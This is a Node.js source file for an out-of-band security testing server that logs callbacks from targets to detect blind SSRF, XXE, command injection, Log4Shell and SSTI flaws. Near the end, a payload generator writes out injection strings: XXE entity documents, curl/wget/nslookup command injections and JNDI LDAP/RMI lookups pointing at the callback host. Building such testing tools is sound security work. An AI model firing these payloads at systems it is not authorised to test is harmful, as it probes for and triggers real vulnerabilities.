const EventEmitter = require('events');
const express = require('express');
const dns = require('dns');
const crypto = require('crypto');

/**
 * Collaborator - Out-of-Band Application Security Testing (OAST) Server
 * Detects blind vulnerabilities (SSRF, XXE, RCE, etc.) through external callbacks
 */
class Collaborator extends EventEmitter {
  constructor(database) {
    super();
    this.db = database;
    this.server = null;
    this.httpPort = 0;
    this.domain = null;
    this.interactions = new Map(); // Track interactions by ID
    this.payloads = new Map(); // Track injected payloads
    this.polling = false;
    this.pollingInterval = null;
  }

  /**
   * Start the Collaborator server
   */
  async start(config = {}) {
    const port = config.port || 0; // 0 = random available port
    const domain = config.domain || 'localhost';

    return new Promise((resolve, reject) => {
      try {
        const app = express();

        // Parse raw body for all requests
        app.use(express.raw({ type: '*/*', limit: '10mb' }));

        // Log all HTTP requests
        app.all('*', (req, res) => {
          this.handleHttpInteraction(req, res);
        });

        this.server = app.listen(port, () => {
          this.httpPort = this.server.address().port;
          this.domain = domain;

          console.log(`Collaborator server started on port ${this.httpPort}`);
          this.emit('started', { port: this.httpPort, domain: this.domain });

          resolve({
            port: this.httpPort,
            domain: this.domain,
            httpUrl: `http://${this.domain}:${this.httpPort}`,
            httpsUrl: `https://${this.domain}:${this.httpPort}`
          });
        });

        this.server.on('error', (error) => {
          reject(error);
        });

      } catch (error) {
        reject(error);
      }
    });
  }

  /**
   * Stop the Collaborator server
   */
  async stop() {
    if (this.pollingInterval) {
      clearInterval(this.pollingInterval);
      this.pollingInterval = null;
    }

    if (this.server) {
      return new Promise((resolve) => {
        this.server.close(() => {
          this.server = null;
          console.log('Collaborator server stopped');
          this.emit('stopped');
          resolve();
        });
      });
    }
  }

  /**
   * Generate a unique payload identifier
   */
  generatePayloadId() {
    return crypto.randomBytes(16).toString('hex');
  }

  /**
   * Generate Collaborator URL for a specific context
   */
  generateCollaboratorUrl(context = {}) {
    const payloadId = this.generatePayloadId();
    const subdomain = payloadId.substring(0, 16);

    const payload = {
      id: payloadId,
      subdomain,
      context: context,
      url: context.url || '',
      parameter: context.parameter || '',
      vulnerabilityType: context.vulnerabilityType || 'unknown',
      createdAt: Date.now(),
      interactions: []
    };

    this.payloads.set(payloadId, payload);

    // Generate callback URL
    const callbackUrl = `http://${subdomain}.${this.domain}:${this.httpPort}`;

    return {
      payloadId,
      url: callbackUrl,
      dnsName: `${subdomain}.${this.domain}`,
      payload
    };
  }

  /**
   * Generate multiple Collaborator URLs
   */
  generateMultipleUrls(count, context = {}) {
    const urls = [];
    for (let i = 0; i < count; i++) {
      urls.push(this.generateCollaboratorUrl(context));
    }
    return urls;
  }

  /**
   * Handle HTTP interaction (callback from target)
   */
  handleHttpInteraction(req, res) {
    const interaction = {
      id: this.generatePayloadId(),
      type: 'http',
      timestamp: Date.now(),
      protocol: req.protocol,
      method: req.method,
      url: req.originalUrl || req.url,
      host: req.get('host'),
      headers: req.headers,
      body: req.body ? req.body.toString() : '',
      ip: req.ip || req.connection.remoteAddress,
      userAgent: req.get('user-agent') || ''
    };

    // Extract subdomain to find matching payload
    const host = req.get('host') || '';
    const subdomain = host.split('.')[0];

    // Find matching payload
    let matchedPayload = null;
    for (const [id, payload] of this.payloads) {
      if (payload.subdomain === subdomain) {
        matchedPayload = payload;
        payload.interactions.push(interaction);
        break;
      }
    }

    // Store interaction
    this.interactions.set(interaction.id, {
      ...interaction,
      payloadId: matchedPayload?.id || null,
      matched: !!matchedPayload
    });

    console.log(`Collaborator interaction: ${interaction.method} ${interaction.url}`);

    // Emit event
    this.emit('interaction', {
      interaction,
      payload: matchedPayload
    });

    // If matched, this indicates a vulnerability
    if (matchedPayload) {
      this.emit('vulnerability-detected', {
        vulnerabilityType: matchedPayload.vulnerabilityType,
        context: matchedPayload.context,
        interaction,
        payload: matchedPayload
      });
    }

    // Send response
    res.status(200).send('OK');
  }

  /**
   * Get all interactions
   */
  getInteractions(filters = {}) {
    let interactions = Array.from(this.interactions.values());

    if (filters.payloadId) {
      interactions = interactions.filter(i => i.payloadId === filters.payloadId);
    }

    if (filters.matched !== undefined) {
      interactions = interactions.filter(i => i.matched === filters.matched);
    }

    if (filters.type) {
      interactions = interactions.filter(i => i.type === filters.type);
    }

    if (filters.since) {
      interactions = interactions.filter(i => i.timestamp >= filters.since);
    }

    return interactions.sort((a, b) => b.timestamp - a.timestamp);
  }

  /**
   * Get payload by ID
   */
  getPayload(payloadId) {
    return this.payloads.get(payloadId);
  }

  /**
   * Get all payloads
   */
  getPayloads() {
    return Array.from(this.payloads.values()).sort((a, b) => b.createdAt - a.createdAt);
  }

  /**
   * Check if payload has received interactions
   */
  hasInteractions(payloadId) {
    const payload = this.payloads.get(payloadId);
    return payload && payload.interactions.length > 0;
  }

  /**
   * Start polling for interactions
   */
  startPolling(interval = 5000) {
    if (this.pollingInterval) {
      clearInterval(this.pollingInterval);
    }

    this.polling = true;
    this.pollingInterval = setInterval(() => {
      this.emit('poll', {
        interactionCount: this.interactions.size,
        payloadCount: this.payloads.size
      });
    }, interval);
  }

  /**
   * Stop polling for interactions
   */
  stopPolling() {
    if (this.pollingInterval) {
      clearInterval(this.pollingInterval);
      this.pollingInterval = null;
    }
    this.polling = false;
  }

  /**
   * Clear old interactions and payloads
   */
  cleanup(olderThan = 3600000) { // Default: 1 hour
    const cutoff = Date.now() - olderThan;

    // Clear old interactions
    for (const [id, interaction] of this.interactions) {
      if (interaction.timestamp < cutoff) {
        this.interactions.delete(id);
      }
    }

    // Clear old payloads
    for (const [id, payload] of this.payloads) {
      if (payload.createdAt < cutoff) {
        this.payloads.delete(id);
      }
    }

    this.emit('cleaned-up', {
      remainingInteractions: this.interactions.size,
      remainingPayloads: this.payloads.size
    });
  }

  /**
   * Generate common OAST payloads for different vulnerability types
   */
  generatePayloadsForVulnerability(vulnerabilityType, targetUrl, parameter) {
    const context = {
      url: targetUrl,
      parameter,
      vulnerabilityType
    };

    const collaboratorUrl = this.generateCollaboratorUrl(context);
    const payloads = [];

    switch (vulnerabilityType) {
      case 'ssrf':
        payloads.push({
          type: 'http',
          payload: collaboratorUrl.url,
          description: 'HTTP SSRF payload'
        });
        payloads.push({
          type: 'redirect',
          payload: `http://example.com@${collaboratorUrl.dnsName}`,
          description: 'URL parser confusion'
        });
        break;

      case 'xxe':
        payloads.push({
          type: 'xxe-basic',
          payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "${collaboratorUrl.url}">]>
<root>&xxe;</root>`,
          description: 'Basic XXE payload'
        });
        payloads.push({
          type: 'xxe-blind',
          payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "${collaboratorUrl.url}">%xxe;]>
<root></root>`,
          description: 'Blind XXE payload'
        });
        break;

      case 'rce':
        payloads.push({
          type: 'curl',
          payload: `curl ${collaboratorUrl.url}`,
          description: 'Curl command injection'
        });
        payloads.push({
          type: 'wget',
          payload: `wget ${collaboratorUrl.url}`,
          description: 'Wget command injection'
        });
        payloads.push({
          type: 'nslookup',
          payload: `nslookup ${collaboratorUrl.dnsName}`,
          description: 'DNS lookup command'
        });
        break;

      case 'log4shell':
        payloads.push({
          type: 'jndi-ldap',
          payload: `\${jndi:ldap://${collaboratorUrl.dnsName}/a}`,
          description: 'Log4Shell JNDI LDAP'
        });
        payloads.push({
          type: 'jndi-rmi',
          payload: `\${jndi:rmi://${collaboratorUrl.dnsName}/a}`,
          description: 'Log4Shell JNDI RMI'
        });
        break;

      case 'ssti':
        payloads.push({
          type: 'ssti-fetch',
          payload: `{{7*7}}{{\\"${collaboratorUrl.url}\\".fetch()}}`,
          description: 'SSTI with fetch'
        });
        break;

      default:
        payloads.push({
          type: 'generic',
          payload: collaboratorUrl.url,
          description: 'Generic callback URL'
        });
    }

    return {
      payloadId: collaboratorUrl.payloadId,
      url: collaboratorUrl.url,
      dnsName: collaboratorUrl.dnsName,
      payloads
    };
  }

  /**
   * Export interactions to JSON
   */
  exportInteractions() {
    return {
      interactions: Array.from(this.interactions.values()),
      payloads: Array.from(this.payloads.values()),
      exportedAt: Date.now()
    };
  }

  /**
   * Get server status
   */
  getStatus() {
    return {
      running: !!this.server,
      port: this.httpPort,
      domain: this.domain,
      polling: this.polling,
      interactionCount: this.interactions.size,
      payloadCount: this.payloads.size,
      httpUrl: this.server ? `http://${this.domain}:${this.httpPort}` : null
    };
  }
}

module.exports = Collaborator;
